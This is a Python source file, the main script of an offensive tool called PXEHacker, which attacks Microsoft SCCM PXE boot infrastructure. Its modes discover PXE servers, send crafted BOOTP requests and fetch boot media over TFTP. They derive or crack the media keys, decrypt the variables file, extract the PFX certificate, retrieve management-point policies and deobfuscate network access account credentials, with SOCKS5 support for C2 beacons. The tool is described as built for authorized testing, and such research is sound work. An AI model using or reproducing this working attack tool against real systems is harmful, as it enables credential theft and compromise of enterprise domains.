#!/usr/bin/env python3
"""PXEHacker — SCCM PXE Exploitation Tool

Merges the best of PXEThief (MWR CyberSec) and cred1py (SpecterOps) into a
unified Linux-first tool for authorized SCCM security testing.

Features:
  - PXE server discovery via DHCP broadcast
  - PXE boot media retrieval and decryption (AES-128/256)
  - SOCKS5 proxy support for C2/beacon-based attacks
  - Direct UDP mode for local network attacks
  - Policy retrieval and CMS decryption (pure Python, no win32crypt)
  - Credential extraction from NAA, Task Sequences, and Collection Variables
  - Credential deobfuscation (3DES, AES-128/192/256)
  - Hashcat hash extraction for offline cracking
"""

import argparse
import binascii
import os
import struct
import sys
import xml.etree.ElementTree as ET

BANNER = r"""
  ___  _  ______  _   _            _
 | _ \\ \/ / ___|| | | | __ _  ___| | _____ _ __
 |  _/ >  <| _|  | |_| |/ _` |/ __| |/ / _ \ '__|
 | |  / /\ \ |___|  _  | (_| | (__|   <  __/ |
 |_| /_/  \_\____|_| |_|\__,_|\___|_|\_\___|_|

 SCCM PXE Exploitation Tool
 Based on PXEThief (MWR CyberSec) and cred1py (SpecterOps)
"""

# Parse arguments
parser = argparse.ArgumentParser(
    description="PXEHacker — SCCM PXE Exploitation Tool",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=BANNER,
)
subparsers = parser.add_subparsers(dest="mode", required=True)

# Discover mode — find PXE servers via DHCP broadcast
discover_parser = subparsers.add_parser("discover", help="Discover PXE servers via DHCP broadcast (requires root)")
discover_parser.add_argument("-i", "--interface", help="Network interface to use (auto-detect if omitted)", default=None)
discover_parser.add_argument("-t", "--timeout", help="DHCP response timeout in seconds", type=int, default=10)

# Attack mode
attack_parser = subparsers.add_parser("attack", help="Run the CRED1 attack against a PXE server")
attack_parser.add_argument("target", help="SCCM PXE Distribution Point IP")
attack_parser.add_argument("src_ip", help="Source IP (your IP or beacon's IP)")
attack_parser.add_argument("socks_host", nargs="?", default=None, help="SOCKS5 proxy host (omit for direct UDP)")
attack_parser.add_argument("socks_port", nargs="?", default=None, type=int, help="SOCKS5 proxy port (omit for direct UDP)")
attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")

# Decrypt mode — decrypt a local .boot.var file with a key
decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downloaded .boot.var file")
decrypt_parser.add_argument("file", help="Path to the .boot.var file")
decrypt_parser.add_argument("key", help="Decryption key (hex)")
decrypt_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")

# Hash mode — extract SCCM hash from local .boot.var file
hash_parser = subparsers.add_parser("hash", help="Extract SCCM hashcat hash from a local .boot.var file")
hash_parser.add_argument("file", help="Path to the .boot.var file")

# Derive-key mode — derive the .var AES key from a captured DHCP option 243 cryptokey blob
derive_parser = subparsers.add_parser(
    "derive-key",
    help="Derive the .var AES key from a captured DHCP option 243 type-2 cryptokey blob (blank-password media)",
)
derive_parser.add_argument(
    "cryptokey",
    help="Cryptokey blob in hex, starting at the inner length byte (the data field of DHCP option 243 sub-record type 2)",
)
derive_parser.add_argument(
    "-f", "--file",
    help="Optional .boot.var file to decrypt with the derived key",
    type=str, default=None,
)
derive_parser.add_argument("-o", "--output", help="Output directory for loot files (when --file is given)", type=str, default="./loot")

# Loot mode — extract PFX and info from already-decrypted XML
loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from decrypted media variables XML")
loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML (produced by 'attack' or 'decrypt' modes)")
loot_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")

# Policies mode — retrieve and decrypt policies from MP using PFX cert
policies_parser = subparsers.add_parser("policies", help="Retrieve policies from MP using PFX cert (extracts NAA creds, task sequences)")
policies_parser.add_argument("xml_file", help="Decrypted media variables XML containing PFX cert (e.g. ./loot/variables.xml)")
policies_parser.add_argument("-o", "--output", help="Output directory for policy files", type=str, default="./loot")
policies_parser.add_argument("--mp", help="Override management point URL", type=str, default=None)
policies_parser.add_argument(
    "--fallback-local",
    help="After remote retrieval, also process local .raw blobs as fallback",
    action="store_true",
)
policies_parser.add_argument(
    "--fallback-input",
    help="Input dir for fallback .raw blobs (default: --output dir)",
    type=str,
    default=None,
)

# Deobfuscate mode — deobfuscate credential strings from NAAConfig.xml or raw hex
deobfuscate_parser = subparsers.add_parser("deobfuscate", help="Deobfuscate SCCM secret='1' credential blobs from policy XML or raw hex")
deobfuscate_parser.add_argument("input", help="Path to NAAConfig.xml file, or a raw hex credential string")

# Local policies mode — decrypt already downloaded .raw policy blobs
policies_local_parser = subparsers.add_parser(
    "policies-local",
    help="Decrypt local .raw policy blobs offline (no network required)",
)
policies_local_parser.add_argument(
    "xml_file",
    help="Decrypted media variables XML containing PFX cert (e.g. ./loot/variables.xml)",
)
policies_local_parser.add_argument(
    "-i", "--input",
    help="Directory containing .raw policy blobs (NAAConfig.raw, TaskSequence_*.raw, CollectionSettings.raw)",
    type=str, default="./loot",
)
policies_local_parser.add_argument("-o", "--output", help="Output directory for decrypted policy files", type=str, default="./loot")

def detect_media_encryption_type(filedata):
    """Detect AES-128 or AES-256 from .boot.var header ALG_ID."""
    header = filedata[:40]
    if len(header) < 40:
        raise ValueError("Media variable file is too short to contain a valid header")
    alg_id = struct.unpack_from("<I", header, 16)[0]
    if alg_id == 0x660E:
        return 128
    if alg_id == 0x6610:
        return 256
    return None


def build_sccm_hash(filedata):
    aes_bits = detect_media_encryption_type(filedata)
    aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
    return f"$sccm${aes_label}${filedata[:40].hex()}", aes_bits

def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
    """Extract PFX cert and key info from decrypted media variables."""
    print("[*] Extracting loot from decrypted media variables...")
    sccm_client.extract_media_variables(decrypted_xml, output_dir)


def main():
    args = parser.parse_args()
    print(BANNER)

    # === Discover mode ===
    if args.mode == "discover":
        from lib.discovery import PXEDiscovery

        disc = PXEDiscovery(interface=args.interface)
        disc.setup_interface()
        result = disc.discover(timeout=args.timeout)
        if result:
            print(f"\n[*] Next step:")
            print(f"    python3 pxehacker.py attack {result['tftp_server']} <your_ip> [socks_host socks_port]")
        sys.exit(0)

    # === Policies / Policies-local modes ===
    if args.mode in ("policies", "policies-local"):
        from lib.policy import PolicyRetriever

        with open(args.xml_file, "r") as f:
            xml_text = f.read()

        root = ET.fromstring(xml_text.encode("utf-16-le"))
        smstsmp_raw = root.find('.//var[@name="SMSTSMP"]').text
        # SMSTSMP can hold multiple MP URLs separated by '*'
        mp_candidates = [u.strip() for u in smstsmp_raw.split("*") if u.strip()]
        if args.mode == "policies" and args.mp:
            mp_candidates = [args.mp]
        site_code = root.find('.//var[@name="_SMSTSSiteCode"]').text
        media_guid = root.find('.//var[@name="_SMSMediaGuid"]').text
        pfx_hex = root.find('.//var[@name="_SMSTSMediaPFX"]').text
        pfx_bytes = bytes.fromhex(pfx_hex)
        pfx_password = media_guid[:31]

        # Prefer GUIDs already present in variables.xml — saves a round trip and
        # works even when the MP refuses MPKEYINFORMATIONMEDIA without auth.
        def _var(name):
            el = root.find(f'.//var[@name="{name}"]')
            return el.text if el is not None else None
        local_guids = {
            "x64": _var("_SMSTSx64UnknownMachineGUID"),
            "x86": _var("_SMSTSx86UnknownMachineGUID"),
            "arm64": _var("_SMSTSarm64UnknownMachineGUID"),
        }

        print(f"[*] MP candidates: {mp_candidates}")
        print(f"[*] Site Code: {site_code}")
        print(f"[*] Media GUID: {media_guid}")
        print(f"[*] PFX Password: {pfx_password}")
        if local_guids["x64"]:
            print(f"[*] x64UnknownMachineGUID (from variables.xml): {local_guids['x64']}")

        last_error = None
        retriever = None
        for mp_url in mp_candidates:
            print(f"[*] Trying MP: {mp_url}")
            retriever = PolicyRetriever(mp_url, site_code, pfx_bytes, pfx_password)
            if args.mode == "policies":
                try:
                    retriever.retrieve_policies(
                        media_guid, args.output,
                        machine_client_id_override=local_guids["x64"],
                    )
                    last_error = None
                    break
                except Exception as e:
                    last_error = e
                    print(f"[!] {mp_url}: {e}")
                    continue
            else:
                break
        if args.mode == "policies" and last_error is not None:
            print(f"[!] All MP candidates failed. Last error: {last_error}")
            sys.exit(1)
        if args.mode == "policies" and args.fallback_local:
            fallback_input = args.fallback_input or args.output
            print(f"[*] Running local fallback from {os.path.abspath(fallback_input)}")
            retriever.process_local_policy_blobs(fallback_input, args.output)
        if args.mode == "policies-local":
            print(f"[*] Input directory: {os.path.abspath(args.input)}")
            retriever.process_local_policy_blobs(args.input, args.output)
        sys.exit(0)

    # === Loot mode ===
    if args.mode == "loot":
        from lib import sccm

        sccm_client = sccm.SCCM(None, None, None)
        with open(args.xml_file, "r") as f:
            xml_text = f.read()
        sccm_client.extract_media_variables(xml_text, args.output)
        sys.exit(0)

    # === Decrypt mode ===
    if args.mode == "decrypt":
        from lib import sccm

        sccm_client = sccm.SCCM(None, None, None)
        try:
            with open(args.file, "rb") as f:
                filedata = f.read()
            print(f"[*] File size: {len(filedata)} bytes")
            aes_bits = sccm_client.detect_encryption_type(filedata)
            print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
            key_bytes = bytes.fromhex(args.key)
            decrypted = sccm_client.decrypt_media_file(filedata, key_bytes)
            handle_decrypted_xml(sccm_client, decrypted, args.output)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
        sys.exit(0)

    # === Deobfuscate mode ===
    if args.mode == "deobfuscate":
        from lib import sccm
        sccm_client = sccm.SCCM(None, None, None)

        if os.path.isfile(args.input):
            with open(args.input, "r") as f:
                xml_text = f.read()
            print(f"[*] Parsing NAAConfig XML: {args.input}")
            results = sccm_client.deobfuscate_naa_xml(xml_text)
            if not results:
                print("[!] No CCM_NetworkAccessAccount instances found in XML")
            for i, (username, password) in enumerate(results):
                print(f"[*] NAA Instance {i}:")
                print(f"[!]   Username: {username!r}" if username else "[!]   Username: (empty)")
                print(f"[!]   Password: {password!r}" if password else "[!]   Password: (empty)")
        else:
            try:
                plaintext = sccm_client.deobfuscate_credential_string(args.input)
                print(f"[!] Deobfuscated: {plaintext}")
            except Exception as e:
                print(f"[!] Failed to deobfuscate: {e}")
        sys.exit(0)

    # === Derive-key mode ===
    if args.mode == "derive-key":
        from lib import sccm

        sccm_client = sccm.SCCM(None, None, None)
        try:
            cryptokey_bytes = bytes.fromhex(args.cryptokey)
        except ValueError as e:
            print(f"[!] Invalid hex for cryptokey: {e}")
            sys.exit(1)
        try:
            derived = sccm_client.derive_blank_decryption_key(cryptokey_bytes)
        except Exception as e:
            print(f"[!] Key derivation failed: {e}")
            print("[*] Expected input: data field of DHCP option 243 sub-record type 2,")
            print("    starting at the inner length byte (cryptokey[0] = length).")
            sys.exit(1)
        print(f"[*] Derived .var AES key: {derived.hex()}")
        if args.file:
            try:
                with open(args.file, "rb") as f:
                    filedata = f.read()
                aes_bits = sccm_client.detect_encryption_type(filedata)
                print(f"[*] File size: {len(filedata)} bytes")
                print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
                decrypted = sccm_client.decrypt_media_file(filedata, derived)
                handle_decrypted_xml(sccm_client, decrypted, args.output)
            except Exception as e:
                print(f"[!] Decryption failed: {e}")
                sys.exit(1)
        else:
            print(f"[*] Decrypt with: python3 pxehacker.py decrypt <variables_file> {derived.hex()}")
        sys.exit(0)

    # === Hash mode ===
    if args.mode == "hash":
        try:
            with open(args.file, "rb") as f:
                filedata = f.read()
            hashcat_hash, aes_bits = build_sccm_hash(filedata)
            if aes_bits:
                print(f"[*] Detected encryption: AES-{aes_bits}")
            else:
                print("[!] Unknown encryption algorithm in header; defaulting hash label to aes128")
            print("[*] Hashcat hash:")
            print(hashcat_hash)
        except Exception as e:
            print(f"[!] Failed to extract hash: {e}")
        sys.exit(0)

    # === Attack mode ===
    if args.target is None or args.src_ip is None:
        print("Usage: python3 pxehacker.py attack <target> <src_ip> [socks_host] [socks_port]")
        sys.exit(1)

    if (args.socks_host is None) != (args.socks_port is None):
        print("[!] Both socks_host and socks_port must be provided together, or omit both for direct UDP")
        sys.exit(1)

    use_socks = args.socks_host is not None

    # Attack-only imports (scapy-dependent)
    from lib import sccm
    from lib import socks, tftp

    def make_client():
        if use_socks:
            return socks.SOCKS5Client(args.socks_host, args.socks_port)
        return socks.DirectUDPClient()

    # Request PXE boot metadata
    client = make_client()
    try:
        client.connect()
        sccm_client = sccm.SCCM(args.target, 4011, client)
        (variables, bcd, cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")
    except Exception as e:
        print(f"[!] PXE boot request failed: {e}")
        sys.exit(1)
    finally:
        client.close()

    print(f"[*] Variables file: {variables}")
    print(f"[*] BCD file: {bcd}")

    # Download the variables file via TFTP
    client = make_client()
    try:
        client.connect()
        tftp_client = tftp.TFTPClient(args.target, 69, client)
        data_variables = tftp_client.get_file(variables)
    except Exception as e:
        print(f"[!] TFTP setup/download failed: {e}")
        print(f"[*] Try downloading the variables file manually from: \\\\{args.target}\\REMINST{variables}")
        sys.exit(1)
    finally:
        client.close()

    if data_variables is None:
        print("[!] TFTP download failed — file must be retrieved manually")
        print(f"[*] Download the variables file from: \\\\{args.target}\\REMINST{variables}")
        if cryptokey is not None:
            print("[*] No PXE password set (crypto key found in DHCP response)")
            decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
            if decrypt_password:
                print(f"[*] Derived key: {decrypt_password.hex()}")
                print(f"[*] Then decrypt with: python3 pxehacker.py decrypt <variables_file> {decrypt_password.hex()}")
        else:
            print("[*] PXE media is password-protected (no crypto key in DHCP response)")
            print("[*] Then decrypt with: python3 pxehacker.py decrypt <variables_file> <cracked_password_hex>")
        sys.exit(0)

    if cryptokey is None:
        # Password IS set — no crypto key in DHCP response, need to crack the hash
        print("[*] PXE media is password-protected (no crypto key in DHCP response)")
        hashcat_hash, aes_bits = build_sccm_hash(data_variables)
        print(f"[*] Detected encryption: AES-{aes_bits or 128}")

        if args.password:
            print("[*] Decrypting media file with supplied password...")
            try:
                password_bytes = bytes.fromhex(args.password)
                decrypted = sccm_client.decrypt_media_file(data_variables, password_bytes)
                handle_decrypted_xml(sccm_client, decrypted, args.output)
            except Exception as e:
                print(f"[!] Decryption failed: {e}")
                print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
        else:
            print("[*] Hashcat hash:")
            print(hashcat_hash)
            print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
            print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
            print(f"[*] Then decrypt with: python3 pxehacker.py decrypt <variables_file> <cracked_password_hex>")
    else:
        # No password set — crypto key IS in the DHCP response, can decrypt directly
        print("[*] No PXE password set (crypto key found in DHCP response)")
        print("[*] Deriving decryption key...")
        decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
        if decrypt_password:
            print("[*] Derived key: " + decrypt_password.hex())
            try:
                decrypted = sccm_client.decrypt_media_file(data_variables, decrypt_password)
                handle_decrypted_xml(sccm_client, decrypted, args.output)
            except Exception as e:
                print(f"[!] Decryption failed: {e}")
                print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
                print(f"[*] Then decrypt with: python3 pxehacker.py decrypt <variables_file> {decrypt_password.hex()}")


if __name__ == "__main__":
    main()
